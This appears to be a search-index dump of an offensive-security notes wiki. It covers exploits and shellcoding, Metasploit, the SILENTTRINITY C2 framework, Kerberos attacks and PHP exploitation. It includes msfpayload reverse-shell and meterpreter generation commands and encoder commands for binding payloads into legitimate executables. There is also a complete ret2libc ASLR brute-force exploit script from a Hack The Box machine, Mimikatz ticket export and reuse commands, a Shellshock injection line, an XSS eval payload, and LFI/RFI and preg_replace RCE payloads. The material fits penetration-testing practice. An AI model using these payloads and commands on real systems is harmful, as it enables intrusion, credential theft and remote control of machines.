MMC20.APPLICATION COM OBJECT: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ LATERAL MOVEMENT VIA DCOM: ROUND 2: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/ Lateral Movement Using Outlook\u2019s CreateObject Method and DotNetToJScript: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/","title":"Lateral Movement"},{"location":"exploits-and-shellcoding/memory-protection/","text":"Memory Protection DEP Perform additional checks on memory, to help prevent malicious code from running on a system. Prevent code execution from data pages, by raising an exception, when execution occurs. Windows - Bypass Data Execution Protection (DEP): https://0x00sec.org/t/bypass-data-execution-protection-dep/6988 Linux - Exploit Mitigation Techniques - Data Execution Prevention (DEP): https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634 ASLR Randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted. Bypass Windows Exploit Guard ASR https://github.com/sevagas/WindowsDefender_ASR_Bypass-OffensiveCon2019","title":"Memory Protection"},{"location":"exploits-and-shellcoding/memory-protection/#memory-protection","text":"","title":"Memory Protection"},{"location":"exploits-and-shellcoding/memory-protection/#dep","text":"Perform additional checks on memory, to help prevent malicious code from running on a system. Prevent code execution from data pages, by raising an exception, when execution occurs. Windows - Bypass Data Execution Protection (DEP): https://0x00sec.org/t/bypass-data-execution-protection-dep/6988 Linux - Exploit Mitigation Techniques - Data Execution Prevention (DEP): https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634","title":"DEP"},{"location":"exploits-and-shellcoding/memory-protection/#aslr","text":"Randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted.","title":"ASLR"},{"location":"exploits-and-shellcoding/memory-protection/#bypass-windows-exploit-guard-asr","text":"https://github.com/sevagas/WindowsDefender_ASR_Bypass-OffensiveCon2019","title":"Bypass Windows Exploit Guard ASR"},{"location":"exploits-and-shellcoding/os-linux-specific/","text":"OS Linux Specific LD_PRELOAD Load a custom library and override functions of a program g++ test.cpp -std=c++11 -shared -o test.so -fPIC #PIC=Position independent code LD_PRELOAD=test.so ldd ./exampleapp Shellshock over Telnet telnet 192.168.0.1 -l () { :;}; /usr/bin/id","title":"OS Linux Specific"},{"location":"exploits-and-shellcoding/os-linux-specific/#os-linux-specific","text":"","title":"OS Linux Specific"},{"location":"exploits-and-shellcoding/os-linux-specific/#ld_preload","text":"Load a custom library and override functions of a program g++ test.cpp -std=c++11 -shared -o test.so -fPIC #PIC=Position independent code LD_PRELOAD=test.so ldd ./exampleapp","title":"LD_PRELOAD"},{"location":"exploits-and-shellcoding/os-linux-specific/#shellshock-over-telnet","text":"telnet 192.168.0.1 -l () { :;}; /usr/bin/id","title":"Shellshock over Telnet"},{"location":"exploits-and-shellcoding/payloads/","text":"Payloads MSF Payload Generation Example msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 C msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 R | msfencode -b '\\x00\\x0a\\x0d' Use exit fuction, \"exit thread\" when program is multi-threaded to avoid crashes after shell code execution is done: msfpayload windows/shell_reverse_tcp EXITFUNC=thread LHOST ip LPORT 4443 R | msfencode -b '\\x00\\x0a\\x0d' VBS msfpayload windows/meterpreter/reverse_tcp LHOST= ip R | msfencode -e generic/none -t vbs","title":"Payloads"},{"location":"exploits-and-shellcoding/payloads/#payloads","text":"","title":"Payloads"},{"location":"exploits-and-shellcoding/payloads/#msf-payload-generation-example","text":"msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 C msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 R | msfencode -b '\\x00\\x0a\\x0d' Use exit fuction, \"exit thread\" when program is multi-threaded to avoid crashes after shell code execution is done: msfpayload windows/shell_reverse_tcp EXITFUNC=thread LHOST ip LPORT 4443 R | msfencode -b '\\x00\\x0a\\x0d'","title":"MSF Payload Generation Example"},{"location":"exploits-and-shellcoding/payloads/#vbs","text":"msfpayload windows/meterpreter/reverse_tcp LHOST= ip R | msfencode -e generic/none -t vbs","title":"VBS"},{"location":"exploits-and-shellcoding/y-Practice/","text":"Practice vsftpd backdoor https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html HTB - Octomber /usr/local/bin/ovrflw NX/DEP is enabled. ASLR is enabled. Passing a pattern to the binary in gdb finds that there is 112 bytes before the buffer is overflowed and the EIP is overwritten. Path and libc address: ldd /usr/local/bin/overflw | grep libc\u200b System offset: readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system \"bin/sh\" address: strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Payload: \u200b JUNK 112 + libcAddress + JUNK 8 + binShAddress Brute forces the binary to bypass ASLR. Note it may take hundreds if not several thousand attempts to hit the correct address. import struct, subprocess libcBase = 0xb75eb000 systemOffset = 0x00040310 binShOffset = 0x00162bac libcAddress = struct.pack( I , libcBase+systemOffset) exitAddress = struct.pack( I , 0xd34db33f) binShAddress = struct.pack( I , libcBase+binShOffset) payload = \\x90 *112 payload += libcAddress payload += exitAddress payload += binShAddress i = 0 while True: i += 1 if i%10 == 0: print Attempts: + str(i) subprocess.call([ /usr/local/bin/ovrflw , payload])","title":"Practice"},{"location":"exploits-and-shellcoding/y-Practice/#practice","text":"","title":"Practice"},{"location":"exploits-and-shellcoding/y-Practice/#vsftpd-backdoor","text":"https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html","title":"vsftpd backdoor"},{"location":"exploits-and-shellcoding/y-Practice/#htb-octomber","text":"/usr/local/bin/ovrflw NX/DEP is enabled. ASLR is enabled. Passing a pattern to the binary in gdb finds that there is 112 bytes before the buffer is overflowed and the EIP is overwritten. Path and libc address: ldd /usr/local/bin/overflw | grep libc\u200b System offset: readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system \"bin/sh\" address: strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Payload: \u200b JUNK 112 + libcAddress + JUNK 8 + binShAddress Brute forces the binary to bypass ASLR. Note it may take hundreds if not several thousand attempts to hit the correct address. import struct, subprocess libcBase = 0xb75eb000 systemOffset = 0x00040310 binShOffset = 0x00162bac libcAddress = struct.pack( I , libcBase+systemOffset) exitAddress = struct.pack( I , 0xd34db33f) binShAddress = struct.pack( I , libcBase+binShOffset) payload = \\x90 *112 payload += libcAddress payload += exitAddress payload += binShAddress i = 0 while True: i += 1 if i%10 == 0: print Attempts: + str(i) subprocess.call([ /usr/local/bin/ovrflw , payload])","title":"HTB - Octomber"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/","text":"Metasploit https://www.offensive-security.com/metasploit-unleashed/Pivoting/ https://www.offensive-security.com/metasploit-unleashed/Portfwd/ https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ General Commands: show auxilary search snmp use snmp_enum info show options set RHOS ip run setg RHOST ip (global set) Hosts: db_nmap ip-range --top-ports 20 (to populate database) Search Services: services -p 443 (search all machines with 443 open) Modifying exploit: ~/.msf4/modules/exploits/windows/misc/vulnserver.rb Post exploitation exploit/windows/local/bypassuac set payload to reverse-shell (so that a new session will be created) migrate to a system privileged process Encode msfpayload ............ | msfconsole -e x86/shikata_ga_nai -t exe -c 9 -o exe.exe Binding msfpayload ............ | msfconsole -e x86/shikata_ga_nai -t exe -c 9 -x goodexe.exe -o bound.exe Auto Migrate set AutoRunScript post/windows/manage/migrate","title":"Metasploit"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#metasploit","text":"https://www.offensive-security.com/metasploit-unleashed/Pivoting/ https://www.offensive-security.com/metasploit-unleashed/Portfwd/ https://www.offensive-security.com/metasploit-unleashed/proxytunnels/","title":"Metasploit"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#general-commands","text":"show auxilary search snmp use snmp_enum info show options set RHOS ip run setg RHOST ip (global set)","title":"General Commands:"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#hosts","text":"db_nmap ip-range --top-ports 20 (to populate database)","title":"Hosts:"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#search-services","text":"services -p 443 (search all machines with 443 open)","title":"Search Services:"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#modifying-exploit","text":"~/.msf4/modules/exploits/windows/misc/vulnserver.rb","title":"Modifying exploit:"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#post-exploitation","text":"exploit/windows/local/bypassuac set payload to reverse-shell (so that a new session will be created) migrate to a system privileged process","title":"Post exploitation"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#encode","text":"msfpayload ............ | msfconsole -e x86/shikata_ga_nai -t exe -c 9 -o exe.exe","title":"Encode"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#binding","text":"msfpayload ............ | msfconsole -e x86/shikata_ga_nai -t exe -c 9 -x goodexe.exe -o bound.exe","title":"Binding"},{"location":"exploits-and-shellcoding/y-Tool-Metasploit/#auto-migrate","text":"set AutoRunScript post/windows/manage/migrate","title":"Auto Migrate"},{"location":"exploits-and-shellcoding/y-Tool-SilentTrinity/","text":"Installations cd /opt git clone https://github.com/byt3bl33d3r/SILENTTRINITY apt-get install python3.7-dev python3-pip cd SILENTTRINITY/Server/ python3.7 -m pip install -r requirements.txt Usage Start HTTP listener: ST (listeners) \u226b use http ST (listeners)(http) \u226b set BindIP 10.10.14.10 ST (listeners)(http) \u226b start [+] Listener 'http' started successfully! Use WMIC stager: ST (listeners)(http) \u226b stagers ST (stagers) \u226b use wmic ST (stagers)(wmic) \u226b generate http [+] Generated stager to wmic.xsl References HTB - Jerry video - https://youtu.be/-O3SPrYhAMo\u200b","title":"y Tool SilentTrinity"},{"location":"exploits-and-shellcoding/y-Tool-SilentTrinity/#installations","text":"cd /opt git clone https://github.com/byt3bl33d3r/SILENTTRINITY apt-get install python3.7-dev python3-pip cd SILENTTRINITY/Server/ python3.7 -m pip install -r requirements.txt","title":"Installations"},{"location":"exploits-and-shellcoding/y-Tool-SilentTrinity/#usage","text":"Start HTTP listener: ST (listeners) \u226b use http ST (listeners)(http) \u226b set BindIP 10.10.14.10 ST (listeners)(http) \u226b start [+] Listener 'http' started successfully! Use WMIC stager: ST (listeners)(http) \u226b stagers ST (stagers) \u226b use wmic ST (stagers)(wmic) \u226b generate http [+] Generated stager to wmic.xsl","title":"Usage"},{"location":"exploits-and-shellcoding/y-Tool-SilentTrinity/#references","text":"HTB - Jerry video - https://youtu.be/-O3SPrYhAMo\u200b","title":"References"},{"location":"exploits-and-shellcoding/y-Tools/","text":"Tools Windows SEToolKit \u2019s Powershell alphanumeric shellcode injector to generate a Meterpreter payload that will bypass Windows Defender Shellter - Dynamic shellcode injection tool, and the first truly dynamic PE infector ever created: [Intro] [Pro-features] Search Sploitus OS w3challs syscall table","title":"Tools"},{"location":"exploits-and-shellcoding/y-Tools/#tools","text":"","title":"Tools"},{"location":"exploits-and-shellcoding/y-Tools/#windows","text":"SEToolKit \u2019s Powershell alphanumeric shellcode injector to generate a Meterpreter payload that will bypass Windows Defender Shellter - Dynamic shellcode injection tool, and the first truly dynamic PE infector ever created: [Intro] [Pro-features]","title":"Windows"},{"location":"exploits-and-shellcoding/y-Tools/#search","text":"Sploitus","title":"Search"},{"location":"exploits-and-shellcoding/y-Tools/#os","text":"w3challs syscall table","title":"OS"},{"location":"exploits-and-shellcoding/z-References/","text":"References Heap Exploitation | Playing with chunks!: https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055 Heap Exploitation - Fastbin Attack: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 Analysis of public exploits or my 1day exploits: https://github.com/externalist/exploit_playground Shellcoding for Linux and Windows Tutorial: http://www.vividmachines.com/shellcode/shellcode.html Voltron is an extensible debugger UI toolkit written in Python: https://github.com/snare/voltron Reverse Shell from an OpenVPN Configuration File: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da Windows Specific Modern Windows Userspace Exploitation: https://media.ccc.de/v/35c3-9660-modern_windows_userspace_exploitation Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup Advice]: http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]: http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]: http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]: http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]: http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html Persistence Maintaining Access Part 1: Introduction and Metasploit Example: https://www.hackingloops.com/maintaining-access-metasploit/ Return oriented programming (ROP) 64-bit ROP | You rule \u2018em all!: https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937 SROP | Signals, you say? (Sigreturn Oriented Programming): https://0x00sec.org/t/srop-signals-you-say/2890","title":"References"},{"location":"exploits-and-shellcoding/z-References/#references","text":"Heap Exploitation | Playing with chunks!: https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055 Heap Exploitation - Fastbin Attack: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 Analysis of public exploits or my 1day exploits: https://github.com/externalist/exploit_playground Shellcoding for Linux and Windows Tutorial: http://www.vividmachines.com/shellcode/shellcode.html Voltron is an extensible debugger UI toolkit written in Python: https://github.com/snare/voltron Reverse Shell from an OpenVPN Configuration File: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da","title":"References"},{"location":"exploits-and-shellcoding/z-References/#windows-specific","text":"Modern Windows Userspace Exploitation: https://media.ccc.de/v/35c3-9660-modern_windows_userspace_exploitation Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup Advice]: http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]: http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]: http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]: http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]: http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html","title":"Windows Specific"},{"location":"exploits-and-shellcoding/z-References/#persistence","text":"Maintaining Access Part 1: Introduction and Metasploit Example: https://www.hackingloops.com/maintaining-access-metasploit/","title":"Persistence"},{"location":"exploits-and-shellcoding/z-References/#return-oriented-programming-rop","text":"64-bit ROP | You rule \u2018em all!: https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937 SROP | Signals, you say? (Sigreturn Oriented Programming): https://0x00sec.org/t/srop-signals-you-say/2890","title":"Return oriented programming (ROP)"},{"location":"identity-and-access-management/kerberos/","text":"Kerberos Silver Tickets Password hashes of service accounts could be used to create Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account. Can request a ticket and do offline brute forcing. https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD KDC does not handle authorization Can request TGS for any service TGS is encrypted using target-service NTLM hash .:. it is possible to brute-force the TGS to get target-service account credentials Find Service Accounts GetUserSPNs https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py PowerView (SPN = Service Principal Name) Get-Netuser -SPN ActiveDirectory Module Install-ActiveDirectoryModule -DllPath C:\\AdModule\\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\\AdModule\\ActiveDirectory.psd1 Get-ADUser -Filter {ServicePrincipalName -ne $null } -Properties ServicePrincipalName Request SPN Ticket Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList server-name PowerView Request-SPNTicket Save Tieket List all tickets in cache (check if granted) klist Mimikatz Invoke-Mimikatz -Command ' kerberos::list /export ' Bruteforce python.exe .\\tgsrepcrack.py .\\password.txt ' ticket ' or use John Kerberos Delegation Allows reusing the end-user credentials to access resources hosted on a different server. Used when Kerberos Double Hop is required. Impersonating the incoming/authentication user is necessary to work. Types: Unconstrained (only Windows Server 2003 ) - Allow authentication to any service in the domain Constrained Unconstrained Kerberos Delegation https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY User provide credentials to DC DC returns TGT User request TGS for web service DC provides TGS (TGS contains user's TGT) User sends TGT and TGS to web Server Web server service account use user's TGT to request a TGS got database server from DC Web server service account can decrypt TGS and extract the user's TGT This is because TGS is encryoted with web server service account's NTLM hash Web server service account connects to database impersonating the user Identifying Nodes with Unconstrained Delegation Enabled Get-NetComputer -UnConstrained Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True} Attack Pattern Compromise the server that use unconstrained delegation Wait for a high privileged connect Once connected, export all the tickets including TGT for that User Invoke-Mimikatz -Command ' sekurlsa::tickets /export ' Reuse tickets with Invoke-Mimikatz -Command ' kerberos::ppt C:\\tickets\\admin.kirbi ' Constrained Kerberos Delegation Only provide access to specified services on a specifiv computer Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute Identifying Users with Unconstrained Delegation Enabled Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth Install-ActiveDirectoryModule -DllPath C:\\AdModule\\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\\AdModule\\ActiveDirectory.psd1 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne $null } -Properties msDS-AllowedToDelegateTo Attack Patterns Protocol Transition used in SSO Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified. https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ Reference: https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/","title":"Kerberos"},{"location":"identity-and-access-management/kerberos/#kerberos","text":"","title":"Kerberos"},{"location":"identity-and-access-management/kerberos/#silver-tickets","text":"Password hashes of service accounts could be used to create Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account. Can request a ticket and do offline brute forcing. https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD KDC does not handle authorization Can request TGS for any service TGS is encrypted using target-service NTLM hash .:. it is possible to brute-force the TGS to get target-service account credentials","title":"Silver Tickets"},{"location":"identity-and-access-management/kerberos/#find-service-accounts","text":"GetUserSPNs https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py PowerView (SPN = Service Principal Name) Get-Netuser -SPN ActiveDirectory Module Install-ActiveDirectoryModule -DllPath C:\\AdModule\\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\\AdModule\\ActiveDirectory.psd1 Get-ADUser -Filter {ServicePrincipalName -ne $null } -Properties ServicePrincipalName","title":"Find Service Accounts"},{"location":"identity-and-access-management/kerberos/#request-spn-ticket","text":"Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList server-name PowerView Request-SPNTicket","title":"Request SPN Ticket"},{"location":"identity-and-access-management/kerberos/#save-tieket","text":"List all tickets in cache (check if granted) klist Mimikatz Invoke-Mimikatz -Command ' kerberos::list /export '","title":"Save Tieket"},{"location":"identity-and-access-management/kerberos/#bruteforce","text":"python.exe .\\tgsrepcrack.py .\\password.txt ' ticket ' or use John","title":"Bruteforce"},{"location":"identity-and-access-management/kerberos/#kerberos-delegation","text":"Allows reusing the end-user credentials to access resources hosted on a different server. Used when Kerberos Double Hop is required. Impersonating the incoming/authentication user is necessary to work. Types: Unconstrained (only Windows Server 2003 ) - Allow authentication to any service in the domain Constrained","title":"Kerberos Delegation"},{"location":"identity-and-access-management/kerberos/#unconstrained-kerberos-delegation","text":"https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY User provide credentials to DC DC returns TGT User request TGS for web service DC provides TGS (TGS contains user's TGT) User sends TGT and TGS to web Server Web server service account use user's TGT to request a TGS got database server from DC Web server service account can decrypt TGS and extract the user's TGT This is because TGS is encryoted with web server service account's NTLM hash Web server service account connects to database impersonating the user","title":"Unconstrained Kerberos Delegation"},{"location":"identity-and-access-management/kerberos/#identifying-nodes-with-unconstrained-delegation-enabled","text":"Get-NetComputer -UnConstrained Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True}","title":"Identifying Nodes with Unconstrained Delegation Enabled"},{"location":"identity-and-access-management/kerberos/#attack-pattern","text":"Compromise the server that use unconstrained delegation Wait for a high privileged connect Once connected, export all the tickets including TGT for that User Invoke-Mimikatz -Command ' sekurlsa::tickets /export ' Reuse tickets with Invoke-Mimikatz -Command ' kerberos::ppt C:\\tickets\\admin.kirbi '","title":"Attack Pattern"},{"location":"identity-and-access-management/kerberos/#constrained-kerberos-delegation","text":"Only provide access to specified services on a specifiv computer Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute","title":"Constrained Kerberos Delegation"},{"location":"identity-and-access-management/kerberos/#identifying-users-with-unconstrained-delegation-enabled","text":"Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth Install-ActiveDirectoryModule -DllPath C:\\AdModule\\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\\AdModule\\ActiveDirectory.psd1 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne $null } -Properties msDS-AllowedToDelegateTo","title":"Identifying Users with Unconstrained Delegation Enabled"},{"location":"identity-and-access-management/kerberos/#attack-patterns","text":"Protocol Transition used in SSO Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified. https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/","title":"Attack Patterns"},{"location":"identity-and-access-management/kerberos/#reference","text":"https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/","title":"Reference:"},{"location":"identity-and-access-management/z-References/","text":"References JWT Stop using JWT for sessions: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ No Way, JOSE! Javascript Object Signing and Encryption is a Bad Standard That Everyone Should Avoid: https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid OAuth2 Bug Reports Twitter: Insufficient OAuth callback validation which leads to Periscope account takeover: https://hackerone.com/reports/110293","title":"References"},{"location":"identity-and-access-management/z-References/#references","text":"","title":"References"},{"location":"identity-and-access-management/z-References/#jwt","text":"Stop using JWT for sessions: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ No Way, JOSE! Javascript Object Signing and Encryption is a Bad Standard That Everyone Should Avoid: https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid","title":"JWT"},{"location":"identity-and-access-management/z-References/#oauth2","text":"","title":"OAuth2"},{"location":"identity-and-access-management/z-References/#bug-reports","text":"Twitter: Insufficient OAuth callback validation which leads to Periscope account takeover: https://hackerone.com/reports/110293","title":"Bug Reports"},{"location":"languages/go/","text":"GO Environment Preparing Your Environment For Go Development: https://www.gopherguides.com/courses/preparing-your-environment-for-go-development?utm_source=twitter utm_campaign=install utm_medium=twitter References https://github.com/parsiya/Hacking-with-Go https://www.blackhat.com/docs/asia-17/materials/asia-17-Clapis-Go-Get-My-Vulnerabilities-An-In-Depth-Analysis-Of-Go-Language-Runtime-And-The-New-Class-Of-Vulnerabilities-It-Introduces.pdf","title":"GO"},{"location":"languages/go/#go","text":"","title":"GO"},{"location":"languages/go/#environment","text":"Preparing Your Environment For Go Development: https://www.gopherguides.com/courses/preparing-your-environment-for-go-development?utm_source=twitter utm_campaign=install utm_medium=twitter","title":"Environment"},{"location":"languages/go/#references","text":"https://github.com/parsiya/Hacking-with-Go https://www.blackhat.com/docs/asia-17/materials/asia-17-Clapis-Go-Get-My-Vulnerabilities-An-In-Depth-Analysis-Of-Go-Language-Runtime-And-The-New-Class-Of-Vulnerabilities-It-Introduces.pdf","title":"References"},{"location":"languages/java/","text":"Java References Java-Deserialization-Cheat-Sheet LLJVM - running comparatively low level languages (such as C) on the JVM: https://github.com/davidar/lljvm","title":"Java"},{"location":"languages/java/#java","text":"","title":"Java"},{"location":"languages/java/#references","text":"Java-Deserialization-Cheat-Sheet LLJVM - running comparatively low level languages (such as C) on the JVM: https://github.com/davidar/lljvm","title":"References"},{"location":"languages/javascript/","text":"Tools CharCode Translator: http://jdstiles.com/java/cct.html img src= x/ script eval(String.fromCharCode(CHARCODE_HERE)); /script","title":"Javascript"},{"location":"languages/javascript/#tools","text":"CharCode Translator: http://jdstiles.com/java/cct.html img src= x/ script eval(String.fromCharCode(CHARCODE_HERE)); /script","title":"Tools"},{"location":"languages/nodejs/","text":"NodeJS Tools Serialize an object including it's function into a JSON Contents for Node.Js Security Course References Exploiting deserialization bugs in Node.js modules for Remote Code Execution Exploiting Node.js deserialization bug for Remote Code Execution Node.js Security: Pentesting and Exploitation \u2013 NJS https://github.com/ajinabraham/Node.Js-Security-Course Node.Js Deserialization Attack \u2013 Detailed Tutorial 2018","title":"NodeJS"},{"location":"languages/nodejs/#nodejs","text":"","title":"NodeJS"},{"location":"languages/nodejs/#tools","text":"Serialize an object including it's function into a JSON Contents for Node.Js Security Course","title":"Tools"},{"location":"languages/nodejs/#references","text":"Exploiting deserialization bugs in Node.js modules for Remote Code Execution Exploiting Node.js deserialization bug for Remote Code Execution Node.js Security: Pentesting and Exploitation \u2013 NJS https://github.com/ajinabraham/Node.Js-Security-Course Node.Js Deserialization Attack \u2013 Detailed Tutorial 2018","title":"References"},{"location":"languages/php/","text":"PHP References Understanding PHP Object Injection https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ http://pentestmonkey.net/tools/web-shells/php-reverse-shell PHP Remote File Inclusion command shell using data:// Hardening and securing PHP on Linux HTTP Parameter Pollution with cookies in PHP Terminate strings using null byte Before PHP 5.3 terminate strings using null byte is possible (%00 in URL) http://example.com?param=../../../../etc/passed - /etc/passed.php http://example.com?param=../../../../etc/passed%00 - /etc/passed Vulnerable functions Local / Remote file inclusion bugs: include() include_once() require() require_once() Local / Remote command execution bugs: eval() preg_replace() fwrite() passthru() file_get_contents() shell_exec() system() SQL Injection bugs: mysql_query() File / File system bugs: fopen() readfile() glob() file() popen() exec() https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/ RCE with PREG Functions implement regular expressions for the preg_ functions (preg_match, preg_replace) /e modifier which allows evaluation of PHP code in the preg_replace Example: ?php $string = this is my lower sting ; print preg_replace('/(.*)/e', 'strtoupper( \\\\1 )', '$string'); ? // THIS IS MY LOWER STING Example Attack: ?php $string = phpinfo() ; print preg_replace('/^(.*)/e', 'strtoupper(\\\\1)', $string); ? Filter Evasion: - Prevent single quote and escape chars Following will fail: $string = system('ls -lah') ; Bypass: $string = `ls -lah` ; Ref: http://www.madirish.net/402 LFI with Filter Inclusion Useful when LFI is possible but \".php\" is appended at end (and not vulnerable to null byte injection) filter/convert.base64-encode forces PHP to base64 encode the file before it is used in the require statement ( index\u200b.php ) http://example.com/?page=php://filter/convert.base64-encode/resource=index\u200b LFI with Zip Inclusion (Include a file inside a zip) If it is possible to upload a zip file http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id LFI to RFI Possible if allow_url_include is on Type Juggling References: - https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf - https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/ - https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro - https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing '0e1234' == '0e4321' '0e1234' == '0' '0e1234' = '1' '0xf' == '15' #0xf in hexadecimal notation is 15 '000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) '0abc...000' == int(0) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0) var_dump( 2 bottles == 2); // == TRUE $values = array( apple , orange , pear , grape ); in_array(0, $values); // == TRUE if($password == secretpass ) // == TRUE when $password=0 Reduction in Entropy (Insecure HMAC) 